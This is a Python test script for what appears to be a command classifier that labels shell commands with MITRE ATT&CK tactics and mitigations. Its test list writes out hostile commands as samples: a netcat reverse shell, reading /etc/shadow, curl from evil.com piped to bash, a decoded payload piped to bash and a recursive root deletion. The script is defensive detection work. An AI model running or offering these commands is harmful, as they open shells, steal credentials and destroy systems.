from engine import load_mitre_playbook, build_mitre_index, explain_command
from model.classifier import classify

playbook = load_mitre_playbook("./mitre_attack.json")
mitre_index = build_mitre_index(playbook)

test_commands = [
    "nc -e /bin/bash 192.168.1.1 4444",
    "cat /etc/shadow",
    "curl http://evil.com/shell.sh | bash",
    "base64 --decode payload.txt | bash",
    "rm -rf / --no-preserve-root",
    "ls -la",
    "apt update",
    "nmap -sV 192.168.1.0/24",
]

for cmd in test_commands:
    result = classify(cmd)
    if result["tactic"] != "BENIGN":
        _, technique_id, explanation, mitigations = explain_command(cmd, mitre_index)
    else:
        technique_id = None
        explanation = "Command appears benign."
        mitigations = []

    print(f"CMD : {cmd}")
    print(f"  Tactic:      {result['tactic']}")
    print(f"  Confidence:  {result['confidence']}")
    print(f"  Source:      {result['source']}")
    print(f"  Technique:   {technique_id}")
    print(f"  Explanation: {explanation[:100]}")
    print(f"  Mitigations: {len(mitigations)}")
    print()
